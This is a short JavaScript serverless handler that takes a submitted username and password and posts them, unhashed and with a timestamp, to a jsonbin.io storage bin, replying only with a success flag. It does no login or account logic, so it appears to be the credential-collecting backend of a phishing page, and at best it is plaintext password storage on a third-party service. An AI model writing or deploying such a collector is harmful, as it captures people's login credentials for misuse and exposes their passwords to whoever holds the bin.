const API_BASE = "https://api.jsonbin.io/v3/b";

function buildHeaders() {
  return {
    "Content-Type": "application/json",
    "X-Master-Key": process.env.JSONBIN_MASTER_KEY,
    "X-Access-Key": process.env.JSONBIN_ACCESS_KEY,
  };
}

module.exports = async function handler(req, res) {
  if (req.method !== "POST") {
    res.setHeader("Allow", "POST");
    return res.status(405).json({ error: "Method not allowed" });
  }

  const { JSONBIN_MASTER_KEY, JSONBIN_ACCESS_KEY } = process.env;

  if (!JSONBIN_MASTER_KEY || !JSONBIN_ACCESS_KEY) {
    return res.status(500).json({ error: "Server configuration incomplete" });
  }

  let body = req.body;
  if (typeof body === "string") {
    try {
      body = JSON.parse(body);
    } catch {
      return res.status(400).json({ error: "Invalid JSON body" });
    }
  }

  const username = typeof body?.username === "string" ? body.username.trim() : "";
  const password = typeof body?.password === "string" ? body.password : "";

  if (!username || !password) {
    return res.status(400).json({ error: "Username and password are required" });
  }

  try {
    const response = await fetch(API_BASE, {
      method: "POST",
      headers: buildHeaders(),
      body: JSON.stringify({
        username,
        password,
        timestamp: new Date().toISOString(),
      }),
    });

    if (!response.ok) {
      return res.status(502).json({ error: "Failed to save submission" });
    }

    return res.status(200).json({ ok: true });
  } catch {
    return res.status(500).json({ error: "Failed to save submission" });
  }
};
